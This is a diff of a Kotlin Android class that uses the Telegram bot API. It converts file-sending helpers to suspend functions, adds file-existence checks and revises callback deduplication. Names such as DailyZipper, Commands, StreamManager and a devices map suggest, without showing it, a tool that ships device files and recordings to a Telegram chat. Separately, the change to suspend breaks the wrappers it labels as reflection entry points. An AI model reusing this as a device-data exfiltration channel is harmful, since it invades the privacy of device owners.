@@ -30,7 +30,9 @@ import com.example.app.safeGet
  * - لا تُطبع التوكنات في السجلات نهائياً (يتم إخفاؤها أو قصها).
  * - قوائم التوكنات محمية بواسطة synchronized وموجودة في ذاكرة التطبيق فقط.
  * 
- * ✅ تم إضافة دعم رفع الملفات (Multipart/Form-Data) لإرسال المستندات والصور والصوتيات.
+ * ✅ تم إصلاح دوال _api لتكون معلقة (suspend) وإزالة runBlocking.
+ * ✅ تم إضافة التحقق من وجود الملفات قبل الإرسال.
+ * ✅ تم استبدال processedUpdates بـ LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى.
  */
 class TelegramUi(
     context: Context,
@@ -67,7 +69,9 @@ class TelegramUi(
 
     private val sessions = ConcurrentHashMap<String, Long>()
     private val devices = ConcurrentHashMap<String, JSONObject>()
-    private val processedUpdates = Collections.synchronizedList(mutableListOf<String>())
+
+    // ✅ استبدال القائمة بـ LinkedHashSet لتحسين الأداء ومنع التكرار مع تنظيف دوري
+    private val processedUpdates = LinkedHashSet<String>()
 
     @Volatile
     private var apiCallsCount = 0
@@ -456,32 +460,34 @@ class TelegramUi(
     // ============================================================
     //  ✅ دوال عامة للاستدعاء عبر الانعكاس (Reflection)
     //  تستخدمها فئات أخرى مثل DailyZipper, Commands, StreamManager
+    //  تم تحويلها إلى دوال معلقة (suspend) وإزالة runBlocking
     // ============================================================
 
     /**
      * استدعاء API عام مع معاملات JSON (للانعكاس)
+     * أصبحت معلقة (suspend) لضمان عدم حظر الخيط الرئيسي.
      */
-    @JvmOverloads
-    fun _api(method: String, params: Map<String, Any>): JSONObject? {
-        return runBlocking {
-            apiCall(method, JSONObject(params))
-        }
+    suspend fun _api(method: String, params: Map<String, Any>): JSONObject? {
+        return apiCall(method, JSONObject(params))
     }
 
     /**
      * استدعاء API مع رفع ملفات (Multipart) (للانعكاس)
+     * أصبحت معلقة (suspend) لضمان عدم حظر الخيط الرئيسي.
      */
-    @JvmOverloads
-    fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
-        return runBlocking {
-            apiCallMultipart(method, params, files)
-        }
+    suspend fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
+        return apiCallMultipart(method, params, files)
     }
 
     /**
      * إرسال مستند (ملف ZIP أو أي ملف) إلى الدردشة
+     * تم إضافة التحقق من وجود الملف قبل الإرسال.
      */
-    fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
+    suspend fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
+        if (!file.exists()) {
+            Log.w(TAG, "File not found: ${file.absolutePath}")
+            return null
+        }
         return _api(
             "sendDocument",
             mapOf("chat_id" to chatId, "caption" to caption),
@@ -491,8 +497,13 @@ class TelegramUi(
 
     /**
      * إرسال صورة إلى الدردشة
+     * تم إضافة التحقق من وجود الملف قبل الإرسال.
      */
-    fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
+    suspend fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
+        if (!file.exists()) {
+            Log.w(TAG, "File not found: ${file.absolutePath}")
+            return null
+        }
         return _api(
             "sendPhoto",
             mapOf("chat_id" to chatId, "caption" to caption),
@@ -502,8 +513,13 @@ class TelegramUi(
 
     /**
      * إرسال ملف صوتي (Voice) إلى الدردشة
+     * تم إضافة التحقق من وجود الملف قبل الإرسال.
      */
-    fun sendVoice(chatId: Long, file: File): JSONObject? {
+    suspend fun sendVoice(chatId: Long, file: File): JSONObject? {
+        if (!file.exists()) {
+            Log.w(TAG, "File not found: ${file.absolutePath}")
+            return null
+        }
         return _api(
             "sendVoice",
             mapOf("chat_id" to chatId),
@@ -513,8 +529,13 @@ class TelegramUi(
 
     /**
      * إرسال ملف فيديو إلى الدردشة
+     * تم إضافة التحقق من وجود الملف قبل الإرسال.
      */
-    fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
+    suspend fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
+        if (!file.exists()) {
+            Log.w(TAG, "File not found: ${file.absolutePath}")
+            return null
+        }
         return _api(
             "sendVideo",
             mapOf("chat_id" to chatId, "caption" to caption),
@@ -524,8 +545,13 @@ class TelegramUi(
 
     /**
      * إرسال ملف صوتي (Audio) إلى الدردشة
+     * تم إضافة التحقق من وجود الملف قبل الإرسال.
      */
-    fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
+    suspend fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
+        if (!file.exists()) {
+            Log.w(TAG, "File not found: ${file.absolutePath}")
+            return null
+        }
         return _api(
             "sendAudio",
             mapOf("chat_id" to chatId, "caption" to caption),
@@ -953,12 +979,13 @@ class TelegramUi(
             val cbId = cb.optString("id")
             if (cbId.isBlank()) return
 
+            // ✅ استخدام LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى
             synchronized(processedUpdates) {
                 if (processedUpdates.contains(cbId)) return
-                processedUpdates.add(cbId)
-                if (processedUpdates.size > 150) {
-                    processedUpdates.removeAt(0)
+                if (processedUpdates.size >= 150) {
+                    processedUpdates.clear()
                 }
+                processedUpdates.add(cbId)
             }
 
             val chatId = cb.optJSONObject("message")?.optJSONObject("chat")?.optLong("id") ?: return
